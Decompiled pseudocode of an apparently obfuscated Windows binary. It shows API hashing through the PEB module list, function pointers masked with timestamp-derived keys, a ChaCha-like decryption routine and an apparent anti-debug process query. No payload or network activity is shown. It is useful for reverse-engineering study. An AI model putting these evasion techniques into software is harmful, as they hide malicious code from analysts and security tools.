// ==== FUN_140001000 @ 140001000 size 51

undefined8 * FUN_140001000(undefined8 *param_1,longlong param_2)

{
  *param_1 = std::exception::vftable;
  param_1[1] = 0;
  param_1[2] = 0;
  __std_exception_copy(param_2 + 8);
  return param_1;
}


// ==== FUN_140001040 @ 140001040 size 19

char * FUN_140001040(longlong param_1)

{
  char *pcVar1;
  
  pcVar1 = "Unknown exception";
  if (*(char **)(param_1 + 8) != (char *)0x0) {
    pcVar1 = *(char **)(param_1 + 8);
  }
  return pcVar1;
}


// ==== FUN_140001060 @ 140001060 size 67

undefined8 * FUN_140001060(undefined8 *param_1,ulonglong param_2)

{
  *param_1 = std::exception::vftable;
  __std_exception_destroy(param_1 + 1);
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}


// ==== FUN_1400010d0 @ 1400010d0 size 33

undefined8 * FUN_1400010d0(undefined8 *param_1)

{
  param_1[2] = 0;
  param_1[1] = "bad array new length";
  *param_1 = std::bad_array_new_length::vftable;
  return param_1;
}


// ==== FUN_140001100 @ 140001100 size 31

void FUN_140001100(void)

{
  undefined8 local_28 [5];
  
  FUN_1400010d0(local_28);
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(local_28,(ThrowInfo *)&DAT_14000f4f8);
}


// ==== FUN_140001120 @ 140001120 size 61

undefined8 * FUN_140001120(undefined8 *param_1,longlong param_2)

{
  *param_1 = std::exception::vftable;
  param_1[1] = 0;
  param_1[2] = 0;
  __std_exception_copy(param_2 + 8);
  *param_1 = std::bad_array_new_length::vftable;
  return param_1;
}


// ==== FUN_140001160 @ 140001160 size 61

undefined8 * FUN_140001160(undefined8 *param_1,longlong param_2)

{
  *param_1 = std::exception::vftable;
  param_1[1] = 0;
  param_1[2] = 0;
  __std_exception_copy(param_2 + 8);
  *param_1 = std::bad_alloc::vftable;
  return param_1;
}


// ==== FUN_1400011a0 @ 1400011a0 size 1089

undefined4 * FUN_1400011a0(undefined4 *param_1)

{
  *param_1 = 0x4bfa9ce2;
  param_1[1] = 0x60162a13;
  param_1[2] = 0xfdbccb68;
  param_1[3] = 0xde5d2042;
  param_1[4] = 0x36e2fe74;
  param_1[5] = 0xa7aa80a;
  param_1[6] = 0x405ee05f;
  param_1[7] = 0xb7be94e6;
  param_1[8] = 0xf9206746;
  param_1[9] = 0x19b88fb;
  param_1[10] = 0x103cf1ea;
  param_1[0xb] = 0x49e75b9e;
  param_1[0xc] = 0x5857245d;
  param_1[0xd] = 0x1199e520;
  return param_1;
}


// ==== FUN_1400015f0 @ 1400015f0 size 533

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

uint * FUN_1400015f0(void)

{
  longlong lVar1;
  ulonglong uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  undefined8 in_RAX;
  uint *puVar11;
  uint uVar12;
  uint uVar13;
  uint uVar14;
  undefined4 local_88 [18];
  
  if (DAT_1400103a1 == '\0') {
    DAT_1400103a1 = '\x01';
    uVar2 = rdtsc();
    DAT_1400102d8 =
         (CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar2) | uVar2 & 0xffffffff00000000) ^
         0x198e1bf87;
    puVar11 = FUN_1400011a0(local_88);
    uVar14 = (uint)(DAT_1400102d8 >> 0x20) ^ (uint)DAT_1400102d8;
    _DAT_1400102c0 = uVar14 ^ puVar11[10];
    DAT_140010298 = uVar14 ^ *puVar11;
    DAT_14001029c = uVar14 ^ puVar11[1];
    DAT_1400102a0 = uVar14 ^ puVar11[2];
    DAT_1400102a4 = uVar14 ^ puVar11[3];
    DAT_1400102a8 = uVar14 ^ puVar11[4];
    DAT_1400102ac = uVar14 ^ puVar11[5];
    DAT_1400102b0 = uVar14 ^ puVar11[6];
    DAT_1400102b4 = uVar14 ^ puVar11[7];
    DAT_1400102b8 = uVar14 ^ puVar11[8];
    DAT_1400102bc = uVar14 ^ puVar11[9];
    _DAT_1400102c4 = uVar14 ^ puVar11[0xb];
    _DAT_1400102c8 = uVar14 ^ puVar11[0xc];
    DAT_1400102cc = uVar14 ^ puVar11[0xd];
  }
  uVar10 = DAT_1400102cc;
  uVar9 = DAT_1400102b8;
  uVar8 = DAT_1400102b4;
  uVar7 = DAT_1400102b0;
  uVar6 = DAT_1400102ac;
  uVar5 = DAT_1400102a8;
  uVar4 = DAT_1400102a4;
  uVar3 = DAT_1400102a0;
  uVar14 = DAT_14001029c;
  uVar13 = (uint)(DAT_1400102d8 >> 0x20) ^ (uint)DAT_1400102d8;
  lVar1 = *(longlong *)ThreadLocalStoragePointer;
  uVar12 = uVar13 ^ DAT_1400102bc;
  *(uint *)(lVar1 + 8) = uVar13 ^ DAT_140010298;
  *(uint *)(lVar1 + 0xc) = uVar13 ^ uVar14;
  *(uint *)(lVar1 + 0x10) = uVar13 ^ uVar3;
  *(uint *)(lVar1 + 0x14) = uVar13 ^ uVar4;
  *(uint *)(lVar1 + 0x18) = uVar13 ^ uVar5;
  *(uint *)(lVar1 + 0x1c) = uVar13 ^ uVar6;
  *(uint *)(lVar1 + 0x20) = uVar13 ^ uVar7;
  *(uint *)(lVar1 + 0x24) = uVar13 ^ uVar8;
  *(uint *)(lVar1 + 0x28) = uVar13 ^ uVar9;
  *(uint *)(lVar1 + 0x2c) = uVar12;
  *(uint *)(lVar1 + 0x30) = uVar13 ^ _DAT_1400102c0;
  *(uint *)(lVar1 + 0x34) = uVar13 ^ _DAT_1400102c4;
  *(uint *)(lVar1 + 0x38) = uVar13 ^ _DAT_1400102c8;
  *(uint *)(lVar1 + 0x3c) = uVar13 ^ uVar10;
  return (uint *)(lVar1 + 8);
}


// ==== FUN_140001810 @ 140001810 size 309

void FUN_140001810(longlong param_1,ulonglong param_2,int *param_3)

{
  uint uVar1;
  uint uVar2;
  ulonglong uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  if (param_2 != 0) {
    uVar3 = 0;
    do {
      uVar1 = (uint)(uVar3 >> 2) ^ *param_3 + param_3[1] ^ param_3[3];
      uVar2 = uVar1 << 0x10 | uVar1 >> 0x10;
      uVar1 = uVar2 + param_3[2] ^ param_3[1];
      uVar4 = uVar1 << 0xc | uVar1 >> 0x14;
      uVar1 = uVar4 + *param_3 + param_3[1];
      uVar5 = uVar1 ^ uVar2;
      uVar6 = uVar5 << 8 | uVar5 >> 0x18;
      uVar5 = uVar6 + uVar2 + param_3[2];
      uVar4 = uVar5 ^ uVar4;
      uVar2 = uVar4 << 7 | uVar4 >> 0x19;
      uVar1 = uVar2 + uVar1;
      uVar6 = uVar1 ^ uVar6;
      uVar6 = uVar6 << 0x10 | uVar6 >> 0x10;
      uVar2 = uVar6 + uVar5 ^ uVar2;
      uVar2 = uVar2 << 0xc | uVar2 >> 0x14;
      uVar1 = uVar2 + uVar1;
      uVar4 = uVar1 ^ uVar6;
      uVar4 = uVar4 << 8 | uVar4 >> 0x18;
      uVar5 = uVar5 + uVar4 + uVar6;
      uVar2 = uVar5 ^ uVar2;
      uVar2 = uVar2 << 7 | uVar2 >> 0x19;
      uVar1 = uVar2 + uVar1;
      uVar4 = uVar1 ^ uVar4;
      uVar6 = uVar4 << 0x10 | uVar4 >> 0x10;
      uVar2 = uVar6 + uVar5 ^ uVar2;
      uVar2 = uVar2 << 0xc | uVar2 >> 0x14;
      uVar1 = uVar2 + uVar1;
      uVar4 = uVar1 ^ uVar6;
      uVar4 = uVar4 << 8 | uVar4 >> 0x18;
      uVar5 = uVar4 + uVar6 + uVar5;
      uVar2 = uVar5 ^ uVar2;
      uVar2 = uVar2 << 7 | uVar2 >> 0x19;
      uVar1 = uVar2 + uVar1;
      uVar4 = uVar1 ^ uVar4;
      uVar6 = uVar4 << 0x10 | uVar4 >> 0x10;
      uVar2 = uVar6 + uVar5 ^ uVar2;
      uVar2 = uVar2 << 0xc | uVar2 >> 0x14;
      uVar1 = uVar2 + uVar1;
      uVar4 = uVar1 ^ uVar6;
      uVar4 = uVar4 << 8 | uVar4 >> 0x18;
      uVar5 = uVar4 + uVar6 + uVar5;
      uVar2 = uVar5 ^ uVar2;
      *(byte *)(uVar3 + param_1) =
           *(byte *)(uVar3 + param_1) ^
           (byte)(((uVar2 << 7 | uVar2 >> 0x19) ^ uVar5 ^ uVar4 ^ uVar1) >> (((byte)uVar3 & 3) << 3)
                 );
      uVar3 = uVar3 + 1;
    } while (uVar3 < param_2);
  }
  return;
}


// ==== FUN_140001950 @ 140001950 size 171

longlong FUN_140001950(uint param_1)

{
  longlong lVar1;
  longlong lVar2;
  longlong *plVar3;
  longlong *plVar4;
  uint uVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  
  if ((ProcessEnvironmentBlock != (void *)0x0) &&
     (lVar2 = *(longlong *)((longlong)ProcessEnvironmentBlock + 0x18), lVar2 != 0)) {
    plVar3 = *(longlong **)(lVar2 + 0x20);
    plVar4 = plVar3;
    if (plVar3 != (longlong *)0x0) {
      while (plVar4 != (longlong *)(lVar2 + 0x20)) {
        if (((plVar4[4] != 0) && (*(ushort *)(plVar4 + 9) != 0)) && (plVar4[10] != 0)) {
          uVar5 = 0x1505;
          uVar7 = (ulonglong)(*(ushort *)(plVar4 + 9) >> 1);
          uVar6 = 0;
          if (uVar7 != 0) {
            do {
              lVar1 = uVar6 * 2;
              uVar6 = uVar6 + 1;
              uVar5 = (*(ushort *)(plVar4[10] + lVar1) | 0x20) ^ uVar5 * 0x21;
            } while (uVar6 < uVar7);
          }
          if (uVar5 == param_1) {
            return plVar4[4];
          }
        }
        plVar4 = (longlong *)*plVar4;
        if (plVar4 == plVar3) {
          return 0;
        }
        if (plVar4 == (longlong *)0x0) {
          return 0;
        }
      }
    }
  }
  return 0;
}


// ==== FUN_140001a00 @ 140001a00 size 240

undefined8 FUN_140001a00(undefined8 param_1,undefined8 param_2)

{
  undefined8 in_RAX;
  ulonglong uVar1;
  undefined8 uVar2;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined1 local_2c;
  undefined2 local_2b;
  undefined1 local_29;
  undefined4 local_28;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined1 local_14;
  undefined2 local_13;
  undefined1 local_11;
  undefined4 local_10;
  
  if (DAT_140010289 == '\0') {
    DAT_140010289 = '\x01';
    uVar1 = rdtsc();
    local_20 = 0xffac29fc;
    local_1c = 0x5b86f888;
    local_18 = 0xf04a518f;
    DAT_140010350 =
         (CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar1) | uVar1 & 0xffffffff00000000) ^
         0x1ebfc9a2d;
    local_14 = 0x5b;
    local_38 = 0xa1443ab4;
    local_13 = 0;
    local_11 = 0;
    local_10 = 0;
    local_2b = 0;
    local_29 = 0;
    local_34 = 0x1a009391;
    local_30 = 0x2c716c77;
    local_2c = 0xda;
    local_28 = 1;
    uVar1 = FUN_140006f00((longlong)&local_20,(longlong)&local_38);
    DAT_140010378 = uVar1 ^ DAT_140010350;
  }
  if ((code *)(DAT_140010378 ^ DAT_140010350) == (code *)0x0) {
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000140001ae0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar2 = (*(code *)(DAT_140010378 ^ DAT_140010350))(0,param_2,0x3000,4);
  return uVar2;
}


// ==== FUN_140001af0 @ 140001af0 size 243

undefined8
FUN_140001af0(undefined8 param_1,undefined8 param_2,undefined4 param_3,undefined8 param_4)

{
  undefined8 in_RAX;
  ulonglong uVar1;
  undefined8 uVar2;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined1 local_34;
  undefined2 local_33;
  undefined1 local_31;
  undefined4 local_30;
  
  if (DAT_140010268 == '\0') {
    DAT_140010268 = '\x01';
    uVar1 = rdtsc();
    local_40 = 0x35036212;
    local_3c = 0x19122151;
    DAT_1400103b0 =
         (CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar1) | uVar1 & 0xffffffff00000000) ^
         0x120bcf817;
    local_38 = 0x86f69e5;
    local_34 = 0xbb;
    local_33 = 0;
    local_31 = 0;
    local_30 = 2;
    local_58 = 0xce6ac4a4;
    local_54 = 0x6d5fea05;
    local_50 = 0xc7a323ba;
    local_4c = 0xec27f5;
    local_48 = 3;
    uVar1 = FUN_1400072c0((longlong)&local_40,(longlong)&local_58);
    DAT_140010270 = uVar1 ^ DAT_1400103b0;
  }
  if ((code *)(DAT_140010270 ^ DAT_1400103b0) == (code *)0x0) {
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000140001bd3. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar2 = (*(code *)(DAT_140010270 ^ DAT_1400103b0))(param_1,param_2,param_3,param_4);
  return uVar2;
}


// ==== FUN_140001bf0 @ 140001bf0 size 225

undefined8 FUN_140001bf0(undefined8 param_1)

{
  undefined8 in_RAX;
  ulonglong uVar1;
  undefined8 uVar2;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined1 local_1c;
  undefined2 local_1b;
  undefined1 local_19;
  undefined4 local_18;
  
  if (DAT_1400103b8 == '\0') {
    DAT_1400103b8 = '\x01';
    uVar1 = rdtsc();
    local_28 = 0x867a3d1c;
    local_24 = 0xf8d44abb;
    DAT_140010398 =
         (CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar1) | uVar1 & 0xffffffff00000000) ^
         0x1657cd7ae;
    local_20 = 0x1d209804;
    local_1c = 0xfb;
    local_1b = 0;
    local_19 = 0;
    local_18 = 4;
    local_38 = 0x2fc8c36f;
    local_34 = 0xc9d25ad3;
    local_30 = 0x69f616b6;
    local_2c = 5;
    uVar1 = FUN_140007680((longlong)&local_28,(longlong)&local_38);
    DAT_140010300 = uVar1 ^ DAT_140010398;
  }
  if ((code *)(DAT_140010300 ^ DAT_140010398) == (code *)0x0) {
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000140001cc1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar2 = (*(code *)(DAT_140010300 ^ DAT_140010398))(param_1,0,0x8000);
  return uVar2;
}


// ==== FUN_140001ce0 @ 140001ce0 size 238

undefined8 FUN_140001ce0(undefined8 param_1)

{
  undefined8 in_RAX;
  ulonglong uVar1;
  undefined8 uVar2;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined1 local_3c;
  undefined2 local_3b;
  undefined1 local_39;
  undefined4 local_38;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  
  if (DAT_1400102f8 == '\0') {
    DAT_1400102f8 = '\x01';
    uVar1 = rdtsc();
    local_48 = 0x309fb5d8;
    local_44 = 0x8786ddcd;
    DAT_1400101d8 =
         (CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar1) | uVar1 & 0xffffffff00000000) ^
         0x155bc736b;
    local_40 = 0x7986ccf6;
    local_3c = 0x7b;
    local_3b = 0;
    local_39 = 0;
    local_38 = 10;
    local_30 = 0x4b6a0e3;
    local_2c = 0x15246a24;
    local_28 = 0xc70f3975;
    local_24 = 0x78498dc5;
    local_20 = 0x51711c9a;
    local_1c = 0x2a786360;
    local_18 = 0xb;
    uVar1 = FUN_1400081c0((longlong)&local_48,(longlong)&local_30);
    DAT_1400102e8 = uVar1 ^ DAT_1400101d8;
  }
  if ((code *)(DAT_1400102e8 ^ DAT_1400101d8) == (code *)0x0) {
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000140001dbe. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar2 = (*(code *)(DAT_1400102e8 ^ DAT_1400101d8))(param_1);
  return uVar2;
}


// ==== FUN_140001dd0 @ 140001dd0 size 256

undefined8 FUN_140001dd0(undefined8 param_1,undefined8 param_2)

{
  undefined8 in_RAX;
  ulonglong uVar1;
  undefined8 uVar2;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined1 local_2c;
  undefined2 local_2b;
  undefined1 local_29;
  undefined4 local_28;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined1 local_10;
  undefined2 local_f;
  undefined1 local_d;
  undefined4 local_c;
  
  if (DAT_140010348 == '\0') {
    DAT_140010348 = '\x01';
    uVar1 = rdtsc();
    local_38 = 0xe6fe9869;
    local_34 = 0x3764aad4;
    DAT_1400101e0 =
         (CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar1) | uVar1 & 0xffffffff00000000) ^
         0x12834d62b;
    local_30 = 0xf9c05736;
    local_2c = 0x48;
    local_2b = 0;
    local_29 = 0;
    local_f = 0;
    local_d = 0;
    local_28 = 0xc;
    local_20 = 0x49354e63;
    local_1c = 0x7d049626;
    local_18 = 0xec0c3ecd;
    local_14 = 0xf7590468;
    local_10 = 0x36;
    local_c = 0xd;
    uVar1 = FUN_140008580((longlong)&local_38,(longlong)&local_20);
    DAT_140010320 = uVar1 ^ DAT_1400101e0;
  }
  if ((code *)(DAT_140010320 ^ DAT_1400101e0) == (code *)0x0) {
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000140001ebb. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar2 = (*(code *)(DAT_140010320 ^ DAT_1400101e0))(param_1,param_2);
  return uVar2;
}


// ==== FUN_140001ed0 @ 140001ed0 size 220

undefined8 FUN_140001ed0(void)

{
  undefined8 in_RAX;
  ulonglong uVar1;
  undefined8 uVar2;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined1 local_2c;
  undefined2 local_2b;
  undefined1 local_29;
  undefined4 local_28;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined1 local_10;
  undefined2 local_f;
  undefined1 local_d;
  undefined4 local_c;
  
  if (DAT_140010368 == '\0') {
    DAT_140010368 = '\x01';
    uVar1 = rdtsc();
    local_38 = 0xa9e2bf79;
    local_34 = 0x1cdf79f4;
    DAT_1400101c0 =
         (CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar1) | uVar1 & 0xffffffff00000000) ^
         0x1416c99e2;
    local_30 = 0xc415fae4;
    local_2c = 0x3d;
    local_2b = 0;
    local_29 = 0;
    local_f = 0;
    local_d = 0;
    local_28 = 0x10;
    local_20 = 0xaf2d35ce;
    local_1c = 0xfa145fe2;
    local_18 = 0x6c74c75f;
    local_14 = 0x421a61cd;
    local_10 = 0x2d;
    local_c = 0x11;
    uVar1 = FUN_140008580((longlong)&local_38,(longlong)&local_20);
    DAT_140010318 = uVar1 ^ DAT_1400101c0;
  }
  if ((code *)(DAT_140010318 ^ DAT_1400101c0) == (code *)0x0) {
    return 0xffffffffffffffff;
  }
                    /* WARNING: Could not recover jumptable at 0x000140001f9c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar2 = (*(code *)(DAT_140010318 ^ DAT_1400101c0))();
  return uVar2;
}


// ==== FUN_140001fb0 @ 140001fb0 size 500

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140001fb0(void)

{
  int iVar1;
  ulonglong uVar2;
  code *pcVar3;
  undefined1 auStack_b8 [32];
  undefined4 local_98;
  undefined4 local_94;
  undefined4 local_90;
  undefined1 local_8c;
  undefined2 local_8b;
  undefined1 local_89;
  undefined4 local_88;
  undefined4 local_80;
  undefined4 local_7c;
  undefined4 local_78;
  undefined4 local_74;
  undefined4 local_70;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined1 local_34;
  undefined2 local_33;
  undefined1 local_31;
  undefined4 local_30;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18 [2];
  ulonglong local_10;
  
  local_10 = DAT_140010000 ^ (ulonglong)auStack_b8;
  if (DAT_140010218 != '\0') {
    return;
  }
  DAT_140010218 = 1;
  uVar2 = rdtsc();
  local_28 = 0xfea34016;
  local_24 = 0xe97e0c7e;
  DAT_140010238 =
       (CONCAT44((int)(local_10 >> 0x20),(int)uVar2) | uVar2 & 0xffffffff00000000) ^ 0x106863ab5;
  local_20 = 0xf2c0;
  local_1c = 0x18;
  local_8b = 0;
  local_89 = 0;
  local_33 = 0;
  local_31 = 0;
  local_98 = 0x3f42e69f;
  local_94 = 0xa1005bea;
  local_90 = 0xf9f917f3;
  local_8c = 0xf0;
  local_88 = 0x19;
  local_68 = 0xc5bed175;
  local_64 = 0xc4ea8b74;
  local_60 = 0x26fd8dc;
  local_5c = 0x1a;
  local_58 = 0xd42cda14;
  local_54 = 0xf3e4bf57;
  local_50 = 0x2db3f83d;
  local_4c = 0x1847;
  local_48 = 0x1b;
  local_40 = 0x2fae4462;
  local_3c = 0xb7d0afc2;
  local_38 = 0xc42874b3;
  local_34 = 0x5d;
  local_30 = 0x1c;
  local_80 = 0x83a2355b;
  local_7c = 0x283f4258;
  local_78 = 0x7a54f4e9;
  local_74 = 0x53dc6f;
  local_70 = 0x1d;
  uVar2 = FUN_1400090c0((longlong)&local_28,(longlong)&local_68);
  DAT_140010228 = uVar2 ^ DAT_140010238;
  _DAT_140010230 = FUN_140009480((longlong)&local_98,(longlong)&local_58);
  _DAT_140010230 = _DAT_140010230 ^ DAT_140010238;
  uVar2 = FUN_1400072c0((longlong)&local_98,(longlong)&local_80);
  DAT_140010220 = uVar2 ^ DAT_140010238;
  pcVar3 = (code *)FUN_140006f00((longlong)&local_98,(longlong)&local_40);
  if (pcVar3 != (code *)0x0) {
    uVar2 = (*pcVar3)(0xfffffff5);
    DAT_140010088 = uVar2 ^ DAT_140010238;
  }
  if ((DAT_140010088 ^ DAT_140010238) == 0xffffffffffffffff) {
    return;
  }
  local_18[0] = 0;
  if (((code *)(DAT_140010220 ^ DAT_140010238) == (code *)0x0) ||
     (iVar1 = (*(code *)(DAT_140010220 ^ DAT_140010238))(DAT_140010088 ^ DAT_140010238,local_18),
     iVar1 == 0)) {
    DAT_140010219 = 0;
  }
  else {
    DAT_140010219 = 1;
  }
  return;
}


// ==== FUN_1400021b0 @ 1400021b0 size 208

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1400021b0(undefined1 param_1)

{
  ulonglong uVar1;
  undefined1 auStack_78 [32];
  undefined8 *local_58;
  undefined1 *local_50;
  undefined4 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined1 local_28 [4];
  undefined4 local_24;
  undefined8 local_20;
  undefined8 local_18;
  ulonglong local_10;
  
  local_10 = DAT_140010000 ^ (ulonglong)auStack_78;
  FUN_140001fb0();
  uVar1 = DAT_140010238 ^ DAT_140010088;
  if (uVar1 != 0xffffffffffffffff) {
    local_28[0] = param_1;
    if (DAT_140010219 == '\0') {
      if ((code *)(DAT_140010228 ^ DAT_140010238) != (code *)0x0) {
        local_38 = 0;
        local_50 = local_28;
        local_40 = 0;
        local_48 = 1;
        local_58 = &local_20;
        local_20 = 0;
        local_18 = 0;
        (*(code *)(DAT_140010228 ^ DAT_140010238))(uVar1,0,0,0);
      }
    }
    else if ((code *)(DAT_140010238 ^ _DAT_140010230) != (code *)0x0) {
      local_24 = 0;
      local_58 = (undefined8 *)0x0;
      (*(code *)(DAT_140010238 ^ _DAT_140010230))(uVar1,local_28,1,&local_24);
    }
  }
  return;
}


// ==== FUN_140002280 @ 140002280 size 63

void FUN_140002280(longlong param_1,uint param_2)

{
  uint uVar1;
  ulonglong uVar2;
  
  if (param_2 != 0) {
    uVar2 = 0;
    do {
      FUN_1400021b0(*(undefined1 *)(uVar2 + param_1));
      uVar1 = (int)uVar2 + 1;
      uVar2 = (ulonglong)uVar1;
    } while (uVar1 < param_2);
  }
  return;
}


// ==== FUN_1400022c0 @ 1400022c0 size 268

void FUN_1400022c0(longlong param_1,ulonglong param_2)

{
  undefined8 in_RAX;
  ulonglong uVar1;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  
  if (DAT_1400101e8 == '\0') {
    DAT_1400101e8 = '\x01';
    uVar1 = rdtsc();
    local_38 = 0x57df048;
    local_34 = 0x67b65559;
    local_30 = 0x93b5;
    DAT_140010390 =
         (CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar1) | uVar1 & 0xffffffff00000000) ^
         0x1862cf54d;
    local_2c = 0x12;
    local_28 = 0x1c333fba;
    local_24 = 0x603a497b;
    local_20 = 0xb3c64476;
    local_1c = 0x8be4c1d1;
    local_18 = 0x7b74986;
    local_14 = 0x13;
    uVar1 = FUN_140008940((longlong)&local_38,(longlong)&local_28);
    DAT_1400101b0 = uVar1 ^ DAT_140010390;
  }
  if ((code *)(DAT_1400101b0 ^ DAT_140010390) != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00014000239c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*(code *)(DAT_1400101b0 ^ DAT_140010390))(param_1,param_2);
    return;
  }
  uVar1 = 0;
  if (param_2 != 0) {
    do {
      *(undefined1 *)(uVar1 + param_1) = 0;
      uVar1 = uVar1 + 1;
    } while (uVar1 < param_2);
  }
  return;
}


// ==== FUN_1400023d0 @ 1400023d0 size 295

void FUN_1400023d0(void *param_1,void *param_2,ulonglong param_3)

{
  undefined8 in_RAX;
  ulonglong uVar1;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  
  if (DAT_140010308 == '\0') {
    DAT_140010308 = '\x01';
    uVar1 = rdtsc();
    local_58 = 0xb282a905;
    local_54 = 0xf2a724c5;
    local_50 = 0x4e7c;
    DAT_140010310 =
         (CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar1) | uVar1 & 0xffffffff00000000) ^
         0x1df64bac4;
    local_4c = 0x16;
    local_48 = 0x36d1bd4f;
    local_44 = 0x6f8dd40a;
    local_40 = 0x7a9a2401;
    local_3c = 0xcd20;
    local_38 = 0x17;
    uVar1 = FUN_140008d00((longlong)&local_58,(longlong)&local_48);
    DAT_140010370 = uVar1 ^ DAT_140010310;
  }
  if ((code *)(DAT_140010370 ^ DAT_140010310) != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00014000249e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*(code *)(DAT_140010370 ^ DAT_140010310))(param_1,param_2,param_3);
    return;
  }
  if (param_3 != 0) {
    uVar1 = 0;
    if ((0xf < param_3) &&
       (((void *)((longlong)param_2 + (param_3 - 1)) < param_1 ||
        (uVar1 = 0, (void *)((longlong)param_1 + (param_3 - 1)) < param_2)))) {
      memcpy(param_1,param_2,param_3);
      return;
    }
    do {
      *(undefined1 *)((longlong)param_1 + uVar1) = *(undefined1 *)((longlong)param_2 + uVar1);
      uVar1 = uVar1 + 1;
    } while (uVar1 < param_3);
  }
  return;
}


// ==== FUN_140002500 @ 140002500 size 275

undefined8 FUN_140002500(undefined8 param_1,undefined4 param_2,undefined8 param_3)

{
  undefined8 in_RAX;
  ulonglong uVar1;
  undefined8 uVar2;
  undefined8 uStack0000000000000028;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  
  if (DAT_14001021a == '\0') {
    DAT_14001021a = '\x01';
    local_38 = 0x4bc334cd;
    local_34 = 0x5d683832;
    local_30 = 0x60f6;
    local_2c = 0x1e;
    local_28 = 0x2104fdad;
    local_24 = 0x494b99a5;
    local_20 = 0x53c75928;
    local_1c = 0x34b97516;
    local_18 = 0x22481863;
    local_14 = 0xd19d0f51;
    local_10 = 0x9614;
    local_c = 0x1f;
    uVar1 = rdtsc();
    DAT_140010250 =
         (CONCAT44((int)((ulonglong)in_RAX >> 0x20),(int)uVar1) | uVar1 & 0xffffffff00000000) ^
         0x144fe7772;
    uVar1 = FUN_140009840((longlong)&local_38,(longlong)&local_28);
    DAT_140010240 = uVar1 ^ DAT_140010250;
  }
  if ((code *)(DAT_140010250 ^ DAT_140010240) == (code *)0x0) {
    return 0xc0000353;
  }
  uStack0000000000000028 = 0;
                    /* WARNING: Could not recover jumptable at 0x000140002610. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  uVar2 = (*(code *)(DAT_140010250 ^ DAT_140010240))(0xffffffffffffffff,param_2,param_3,8);
  return uVar2;
}


// ==== FUN_140002620 @ 140002620 size 45

undefined8 FUN_140002620(longlong param_1,longlong param_2)

{
  int iVar1;
  ulonglong uVar2;
  
  uVar2 = 0;
  while( true ) {
    iVar1 = (int)uVar2;
    if (0xf < iVar1) break;
    *(undefined1 *)(iVar1 + param_2) = *(undefined1 *)(iVar1 + param_1);
    uVar2 = (ulonglong)(iVar1 + 1);
  }
  return CONCAT71((int7)(uVar2 >> 8),1);
}


